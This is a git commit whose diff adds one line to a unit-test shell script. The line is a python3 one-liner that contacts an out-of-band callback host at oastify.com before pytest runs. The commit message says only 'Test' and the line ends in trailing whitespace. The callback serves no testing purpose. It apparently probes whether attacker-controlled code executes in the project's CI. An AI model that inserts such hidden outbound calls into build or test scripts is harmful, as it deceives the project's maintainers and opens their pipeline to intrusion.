ef09e3c9b69f1186e0d246077813fd30d1792770
ps-ws <110921833+ps-ws@users.noreply.github.com>
2022-08-10 16:44:06 -0400

    Update task_unit_test.sh 3
    Test

--- task_unit_test.sh
+++ task_unit_test.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 
+python3 -c "import urllib.request; urllib.request.urlopen('https://pmf5tiyi818ocb3lf70dpfpg2780wp.oastify.com/taskunittest3').read()"       
 python3 -m pip install pytest
 python3 -m pytest -v --junitxml=pytest_basics.xml --durations=10 test_basics.py
